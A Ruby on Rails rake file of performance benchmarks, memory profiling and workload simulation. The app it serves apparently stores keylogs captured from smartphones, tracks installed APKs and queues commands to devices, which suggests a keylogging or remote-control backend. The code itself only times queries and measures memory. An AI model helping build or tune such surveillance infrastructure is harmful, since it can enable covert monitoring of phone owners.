# frozen_string_literal: true

namespace :perf do
  desc "Run performance benchmarks against key operations"
  task benchmark: :environment do
    require 'benchmark'

    puts "\n🏋️  Performance Benchmarks"
    puts "=" * 80

    # Database benchmarks
    puts "\n📊 Database Operations:"
    device = Smartphone.first
    unless device
      puts "  ⚠ No devices found. Skipping database benchmarks."
      next
    end

    Benchmark.bm(35) do |x|
      x.report("Device lookup by ID:") do
        100.times { Smartphone.find(device.id) }
      end

      x.report("Device lookup by device_id:") do
        100.times { Smartphone.find_by(device_id: device.device_id) }
      end

      x.report("Recent keylogs (limit 100):") do
        10.times { device.keylogs.order(created_at: :desc).limit(100).to_a }
      end

      x.report("Pending commands count:") do
        100.times { PendingCommand.where(status: :pending).count }
      end

      x.report("Dashboard query:") do
        5.times { OptimizedQueries.device_dashboard }
      end

      x.report("Connection pool stats:") do
        100.times { OptimizedQueries.connection_pool_stats }
      end
    end

    # Redis benchmarks
    puts "\n🔴 Redis Operations:"
    Benchmark.bm(35) do |x|
      x.report("ConnectionMonitor register:") do
        100.times do |i|
          ConnectionMonitor.register("bench-#{i}", connection_type: 'device')
        end
      end

      x.report("ConnectionMonitor touch:") do
        100.times do |i|
          ConnectionMonitor.touch("bench-#{i}")
        end
      end

      x.report("HeartbeatMonitor process:") do
        100.times do |i|
          HeartbeatMonitor.process_heartbeat("bench-#{i}")
        end
      end

      x.report("ConnectionMonitor stats:") do
        10.times { ConnectionMonitor.statistics }
      end

      x.report("ConnectionMonitor cleanup:") do
        100.times do |i|
          ConnectionMonitor.unregister("bench-#{i}")
        end
      end
    end

    puts "\n" + "=" * 80
    puts "✓ Benchmarks complete\n"
  end

  desc "Profile memory usage of key operations"
  task profile: :environment do
    puts "\n🔬 Memory Profiling"
    puts "=" * 80

    initial_rss = measure_rss
    puts "\n  Initial RSS: #{format_bytes(initial_rss)}"

    # Profile device queries
    puts "\n  📊 Profiling device queries..."
    rss_before = measure_rss
    100.times { Smartphone.includes(:apk_installation).limit(25).to_a }
    GC.start
    rss_after = measure_rss
    puts "    Device queries (100x): #{format_delta(rss_before, rss_after)}"

    # Profile command creation
    puts "\n  📝 Profiling command creation..."
    device = Smartphone.first
    if device
      rss_before = measure_rss
      commands = 100.times.map do
        PendingCommand.create!(
          smartphone: device,
          request_id: SecureRandom.uuid,
          command: 'test_profile',
          status: :pending
        )
      end
      GC.start
      rss_after = measure_rss
      puts "    Command creation (100x): #{format_delta(rss_before, rss_after)}"

      # Clean up
      PendingCommand.where(command: 'test_profile').delete_all
    end

    # Profile Redis operations
    puts "\n  🔴 Profiling Redis operations..."
    rss_before = measure_rss
    200.times do |i|
      ConnectionMonitor.register("profile-#{i}", connection_type: 'device')
      ConnectionMonitor.touch("profile-#{i}")
    end
    200.times { |i| ConnectionMonitor.unregister("profile-#{i}") }
    GC.start
    rss_after = measure_rss
    puts "    Redis register/touch/unregister (200x): #{format_delta(rss_before, rss_after)}"

    # Final summary
    GC.start
    final_rss = measure_rss
    puts "\n  Final RSS: #{format_bytes(final_rss)}"
    puts "  Total growth: #{format_delta(initial_rss, final_rss)}"

    puts "\n" + "=" * 80
    puts "✓ Profiling complete\n"
  end

  desc "Track memory usage over simulated workload"
  task memory: :environment do
    puts "\n🧠 Memory Usage Tracking"
    puts "=" * 80

    samples = []
    gc_stats_start = GC.stat

    puts "\n  Running simulated workload (10 cycles)...\n"

    10.times do |cycle|
      GC.start
      rss = measure_rss
      gc_count = GC.count
      gc_stat = GC.stat

      samples << {
        cycle: cycle,
        rss: rss,
        gc_count: gc_count,
        heap_live: gc_stat[:heap_live_slots],
        heap_free: gc_stat[:heap_free_slots],
        total_allocated: gc_stat[:total_allocated_objects],
        total_freed: gc_stat[:total_freed_objects]
      }

      # Simulate workload
      simulate_workload_cycle

      printf "  Cycle %2d: RSS=%-10s  Live=%d  Free=%d  GC=%d\n",
             cycle, format_bytes(rss),
             gc_stat[:heap_live_slots], gc_stat[:heap_free_slots], gc_count
    end

    # Summary
    gc_stats_end = GC.stat
    puts "\n  Summary:"
    puts "    RSS start:  #{format_bytes(samples.first[:rss])}"
    puts "    RSS end:    #{format_bytes(samples.last[:rss])}"
    puts "    RSS growth: #{format_delta(samples.first[:rss], samples.last[:rss])}"
    puts "    GC runs:    #{gc_stats_end[:count] - gc_stats_start[:count]}"
    puts "    Objects allocated: #{gc_stats_end[:total_allocated_objects] - gc_stats_start[:total_allocated_objects]}"
    puts "    Objects freed:     #{gc_stats_end[:total_freed_objects] - gc_stats_start[:total_freed_objects]}"

    puts "\n" + "=" * 80
    puts "✓ Memory tracking complete\n"
  end
end

# Helper methods (defined at top level for rake task access)
def measure_rss
  if Gem.win_platform?
    pid = Process.pid
    output = `tasklist /FI "PID eq #{pid}" /FO CSV /NH 2>NUL`.strip
    match = output.match(/"([\d,]+)\s*K"/)
    match ? match[1].delete(',').to_i * 1024 : 0
  else
    `ps -o rss= -p #{Process.pid}`.strip.to_i * 1024
  end
rescue StandardError
  0
end

def format_bytes(bytes)
  return '0 B' if bytes == 0

  units = %w[B KB MB GB]
  exp = (Math.log(bytes.abs) / Math.log(1024)).to_i
  exp = units.size - 1 if exp >= units.size
  "%.1f %s" % [bytes.to_f / (1024**exp), units[exp]]
end

def format_delta(before, after)
  delta = after - before
  sign = delta >= 0 ? '+' : ''
  "#{sign}#{format_bytes(delta)}"
end

def simulate_workload_cycle
  device = Smartphone.first
  return unless device

  # Simulate typical operations
  Smartphone.includes(:apk_installation).limit(10).to_a
  device.keylogs.order(created_at: :desc).limit(50).to_a rescue nil
  PendingCommand.where(status: :pending).limit(20).to_a

  5.times do |i|
    id = "memtrack-#{i}"
    ConnectionMonitor.register(id, connection_type: 'device')
    ConnectionMonitor.touch(id)
    ConnectionMonitor.unregister(id)
  end
end
